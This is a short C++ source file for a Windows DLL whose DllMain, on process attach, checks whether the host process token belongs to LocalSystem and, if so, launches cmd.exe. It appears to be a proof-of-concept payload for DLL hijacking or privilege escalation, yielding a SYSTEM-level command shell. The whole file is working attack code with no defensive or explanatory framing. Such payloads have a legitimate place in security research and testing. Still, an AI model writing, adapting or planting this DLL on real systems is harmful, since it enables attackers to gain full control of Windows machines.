// Launches cmd.exe if loaded into a process running as SYSTEM.

#include "pch.h"

#include <memory>

void DoIt()
{
    HANDLE hToken = GetCurrentProcessToken();
    DWORD infoSize;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &infoSize);
    auto buffer = std::make_unique<char[]>(infoSize);
    if (!GetTokenInformation(hToken, TokenUser, buffer.get(), infoSize, &infoSize))
    {
        return;
    }
    _TOKEN_USER* tokenUser = (_TOKEN_USER*)buffer.get();
    if (!IsWellKnownSid(tokenUser->User.Sid, WinLocalSystemSid))
    {
        return;
    }

    STARTUPINFO startupInfo;
    memset(&startupInfo, 0, sizeof(startupInfo));
    PROCESS_INFORMATION processInfo;
    memset(&processInfo, 0, sizeof(processInfo));
    wchar_t commandLine[] = L"cmd.exe";
    if (!CreateProcess(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
    {
        return;
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DoIt();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

